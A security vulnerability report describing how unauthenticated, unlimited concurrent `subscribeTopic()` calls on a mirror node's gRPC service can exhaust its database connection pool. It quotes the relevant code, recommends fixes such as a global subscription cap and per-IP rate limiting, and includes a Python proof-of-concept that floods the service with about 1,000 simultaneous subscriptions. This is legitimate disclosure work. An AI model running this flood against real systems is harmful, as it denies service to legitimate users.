### Title
Unbounded Concurrent Historical Subscriptions Saturate DB Connection Pool via `subscribeTopic()`

### Summary
The `subscribeTopic()` endpoint in `ConsensusController` imposes no global rate limit, no per-IP subscription cap, and no authentication requirement. An unprivileged attacker can open an arbitrary number of TCP connections (each carrying up to 5 concurrent gRPC calls per the `maxConcurrentCallsPerConnection` default), each with `limit=1` and `startTime=0`, forcing simultaneous DB queries through `TopicMessageRetriever`. Because the only concurrency guard is per-connection (not global), the attacker can exhaust the finite R2DBC/HikariCP connection pool, starving legitimate long-running subscriptions of DB connections.

### Finding Description

**Code path:**

`ConsensusController.subscribeTopic()` (lines 43–53) accepts any `ConsensusTopicQuery` with no authentication or rate-limiting check:

```java
public void subscribeTopic(ConsensusTopicQuery request, StreamObserver<ConsensusTopicResponse> responseObserver) {
    final var disposable = Mono.fromCallable(() -> toFilter(request))
            .flatMapMany(topicMessageService::subscribeTopic)
            ...
``` [1](#0-0) 

`toFilter()` (lines 55–73) builds a `TopicMessageFilter`. `limit` has `@Min(0)` and `startTime` has `@Min(0)` with the only validation being `startTime <= DomainUtils.now()`. Both `limit=1` and `startTime=0` pass all constraints: [2](#0-1) 

`TopicMessageServiceImpl.subscribeTopic()` (lines 59–92) immediately calls `topicMessageRetriever.retrieve(filter, true)` — a live DB query — for every subscriber, with no global concurrency cap. The `subscriberCount` field is a **metric gauge only**, not an enforced limit: [3](#0-2) 

The only concurrency control is `maxConcurrentCallsPerConnection = 5` in `NettyProperties`, which is **per TCP connection**, not global: [4](#0-3) 

`RetrieverProperties` sets `maxPageSize=1000` (throttled) and `pollingFrequency=2s`, but these control page size and polling cadence — not the number of concurrent retrieval sessions: [5](#0-4) 

The web3 throttle (bucket4j) exists only in the `web3` module and is entirely absent from the `grpc` module: [6](#0-5) 

**Root cause:** The gRPC service has no global concurrent-subscription limit, no per-IP rate limit, and no authentication. The per-connection cap of 5 is trivially bypassed by opening many connections.

### Impact Explanation
Each `limit=1, startTime=0` subscription triggers one DB query that fetches the oldest topic message. With N TCP connections × 5 calls each, the attacker generates N×5 simultaneous DB queries. Once the R2DBC/HikariCP pool (finite, visible in the Grafana dashboard as `hikaricp_connections_max`) is exhausted, all new DB operations — including those for legitimate long-running live subscriptions — queue or time out. This degrades throughput for all users of the gRPC service without any economic cost to the attacker. Severity: Medium (griefing/DoS, no data exfiltration, no economic damage to network participants).

### Likelihood Explanation
No privileges, tokens, or on-chain accounts are required. Any host with network access to port 5600 can execute this. A single attacker machine can open thousands of TCP connections. The attack is repeatable and scriptable with any gRPC client library. The `maxConcurrentCallsPerConnection=5` default is documented in `configuration.md` and is publicly known: [7](#0-6) 

### Recommendation
1. **Add a global concurrent-subscription cap** enforced atomically against `subscriberCount` in `TopicMessageServiceImpl`, returning `RESOURCE_EXHAUSTED` when exceeded.
2. **Add per-IP rate limiting** at the gRPC interceptor layer (analogous to the bucket4j throttle in the web3 module) to cap new `subscribeTopic` calls per second per source IP.
3. **Enforce a minimum `startTime`** (e.g., reject requests with `startTime` older than a configurable horizon) to prevent full-table-scan-style historical queries from being used as a cheap amplifier.
4. **Set a maximum `limit`** floor (e.g., reject `limit=0` or `limit=1` combined with very old `startTime`) or require a minimum `limit` to reduce the ratio of DB queries to useful work.

### Proof of Concept
```python
import grpc
import threading
from hedera.mirror.api.proto import consensus_service_pb2_grpc
from hedera.mirror.api.proto import consensus_service_pb2
from hederahashgraph.api.proto.java import basic_types_pb2, timestamp_pb2

TARGET = "mirror-node-grpc:5600"
TOPIC_ID = basic_types_pb2.TopicID(shardNum=0, realmNum=0, topicNum=1)
NUM_CONNECTIONS = 200  # each carries 5 concurrent calls = 1000 simultaneous DB queries

def flood():
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = consensus_service_pb2.ConsensusTopicQuery(
        topicID=TOPIC_ID,
        consensusStartTime=timestamp_pb2.Timestamp(seconds=0, nanos=0),
        limit=1,
    )
    threads = []
    for _ in range(5):  # maxConcurrentCallsPerConnection default
        t = threading.Thread(target=lambda: list(stub.subscribeTopic(query)))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

workers = [threading.Thread(target=flood) for _ in range(NUM_CONNECTIONS)]
for w in workers:
    w.start()
for w in workers:
    w.join()
# Result: ~1000 simultaneous DB queries; pool saturated; legitimate subscribers time out
```

    public Flux<TopicMessage> subscribeTopic(TopicMessageFilter filter) {
        log.info("Subscribing to topic: {}", filter);
        TopicContext topicContext = new TopicContext(filter);

        Flux<TopicMessage> historical = topicMessageRetriever.retrieve(filter, true);
        Flux<TopicMessage> live = Flux.defer(() -> incomingMessages(topicContext));

        // Safety Check - Polls missing messages after 1s if we are stuck with no data
        Flux<TopicMessage> safetyCheck = Mono.delay(Duration.ofSeconds(1L))
                .filter(_ -> !topicContext.isComplete())
                .flatMapMany(_ -> missingMessages(topicContext, null))
                .subscribeOn(Schedulers.boundedElastic());

        Flux<TopicMessage> flux = historical
                .concatWith(Flux.merge(safetyCheck, live).takeUntilOther(pastEndTime(topicContext)))
                .filter(t -> {
                    TopicMessage last = topicContext.getLast();
                    return last == null || t.getSequenceNumber() > last.getSequenceNumber();
                });

        if (filter.getEndTime() != null) {
            flux = flux.takeWhile(t -> t.getConsensusTimestamp() < filter.getEndTime());
        }

        if (filter.hasLimit()) {
            flux = flux.take(filter.getLimit());
        }

        return topicExists(filter)
                .thenMany(flux.doOnNext(topicContext::onNext)
                        .doOnSubscribe(s -> subscriberCount.incrementAndGet())
                        .doFinally(s -> subscriberCount.decrementAndGet())
                        .doFinally(topicContext::finished));
    }
